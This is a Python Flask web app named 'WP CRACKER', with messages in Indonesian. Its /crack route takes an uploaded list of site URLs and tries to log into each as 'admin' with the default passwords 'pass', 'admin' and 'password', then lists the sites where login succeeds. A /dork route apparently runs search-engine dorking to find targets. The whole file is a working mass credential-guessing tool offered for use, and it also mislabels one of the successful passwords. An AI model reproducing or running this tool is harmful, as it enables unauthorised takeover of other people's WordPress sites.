import login
from flask import *
import dork
import os
app=Flask('__name__')
@app.route('/', methods=['GET','POST'])
def index():
	return 'WELLCOME TO WP CRACKER'
@app.route('/crack',methods=['GET','POST'])
def auto_wp():
	try:
		ve=[]
		if request.files['list_url']:
			x=request.files['list_url'].read().decode('utf-8').split('\n')
			x.remove('')
			for j in x:
				if login.__start__(j,'admin','pass') == True:
					ve.append('[sukses] username : %s password : %s result : %s'%('admin','pass',j))
				elif login.__start__(j,'admin','admin') == True:
					ve.append('[sukses] username : %s password : %s result : %s'%('admin','admin',j))
				elif login.__start__(j,'admin','password') == True:
					ve.append('[sukses] username : %s password : %s result : %s'%('admin','pass',j))
				else:
					ve.append(' [gagal!] result : %s'%(j))
			return str(ve)
		else:
			return 'error'
	except KeyError:
		return 'list tidak ada'
@app.route('/dork',methods=['GET','POST'])
def dork_term():
	try:
		keyword=request.form.get('keyword')
		waktu=request.form.get('time')
		page=request.form.get('page')
		return dork.__start__(keyword,waktu,page)
	except:
		return 'error'
if __name__ == '__main__':
	app.run(host='0.0.0.0',port=int(os.environ.get('PORT','5000')),debug=True)
